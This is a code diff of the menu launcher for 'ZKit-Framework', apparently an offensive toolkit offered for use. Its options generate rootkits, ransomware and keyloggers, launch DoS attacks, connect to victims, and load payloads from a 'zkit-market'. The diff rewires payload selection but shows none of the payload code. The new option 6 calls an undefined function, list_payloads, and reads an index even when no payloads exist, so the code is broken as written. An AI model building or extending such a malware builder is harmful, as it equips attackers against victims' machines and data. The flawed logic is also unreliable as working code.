@@ -3,18 +3,21 @@
 # This Work Is Licensed Under Apache Software License 2.0 More
 # Can Be Found In The LICENSE File.
 __author__ = "Zer0"
-__version__ = "1.4.2"
+__version__ = "1.4.5"
 __license__ = "Apache Software License 2.0"
 __status__ = "Production"
 import os
 from datetime import datetime as dt
+import sys
+
+
 def start():
     "Starts zkit with those beautiful menues"
     try:
         try:
             # Doing some imports
-            from core.helper_core import notify, Color, generate, dos, \
-                ctrler, helpbanner, init, print_banner
+            from core.helper_core import notify, Color, Generate, dos, \
+                ctrler, helpbanner, init, print_banner, list_builtin_payloads, search_for_payloads, crash_handler
         except (ImportError, ModuleNotFoundError) as value:
             # Ops ! Sth is missing
 
@@ -41,6 +44,7 @@ def start():
             + blue + "  {3} --> Create A KeyLogger \n"
             + yellow + "  {4} --> Run A Dos Attack\n"
             + magenta + "  {5} --> Connect To A Victim\n"
+            + red + "  {6} --> Generate Your User Payloads\n"
             + cyan + "  {000}" + "--> Exit ZKit-Framework\n" + reset
         )
         while True:
@@ -52,20 +56,39 @@ def start():
                 if choice == "?":
                     print(helpbanner)
                 elif choice == "1":
-                    generate("rootkit")
+                    payloads = list_builtin_payloads('rootkit')
+                    index = input("")
+                    Generate(list(payloads.values())[int(index) - 1])
+
                 elif choice == "2":
-                    print("This Feature (Ransomware) is beta and have not tested . continue anyway ? (Y/N) : ", end="")
-                    agreed = True if str(input("")).lower().strip() == "y" else False
+                    print(
+                        "This Feature (Ransomware) is beta and have not tested . continue anyway ? (Y/N) : ", end="")
+                    agreed = True if str(
+                        input("")).lower().strip() == "y" else False
                     if agreed:
-                        generate("ransomware")
-                    else :
+                        payloads = list_builtin_payloads('ransomware')
+                        index = input("")
+                        Generate(list(payloads.values())[int(index) - 1])
+                    else:
                         print("Ignoring . Back To Main Menu.")
                 elif choice == "3":
-                    generate("keylogger")
+                    payloads = list_builtin_payloads('keylogger')
+                    index = input("")
+                    Generate(list(payloads.values())[int(index) - 1])
+
                 elif choice == "4":
                     dos.main()
                 elif choice == "5":
                     ctrler.Main()
+                elif choice == "6":
+                    payloads = list_payloads()
+                    if len(payloads) == 0:
+                        print(
+                            "No User Payload Was Found . Please Download one from zkit-market or make one using zkit-payload-template")
+                    else:
+                        print("Please Choose One Of Them (Number Of It): ", end="")
+                    index = input("")
+                    Generate(list(payloads.values())[int(index) - 1])
                 elif choice is not None:
                     notify(
                         "problem", "Invalid Input {" + "{}".format(choice) + "}")
@@ -73,18 +96,7 @@ def start():
                 print("\nPlease Type '000' To Exit ZKit-Framework\n")
                 choice = None
     except BaseException as e:
-        with open(os.path.dirname(__file__) + "\\Errors.log", "a") as f:
-            f.write("[{}] : {}\n".format(dt.now(), e))
-        print("Sth went really wrong that we couldnt handle it\n"
-              + "the exceptions value have saved to Errors.log\n"
-              + "please report this on github to me."
-              + "Do you want zkit to reraise it ? (reraising may help better) (Y/N): ", end='')
-        choice = str(input()).lower()
-        if choice.strip() == "y":
-            print("This is goign to print full error . please report it on github")
-            raise 
-        else :
-            print("Ignoring")
+        crash_handler(e)
 
 
 start()
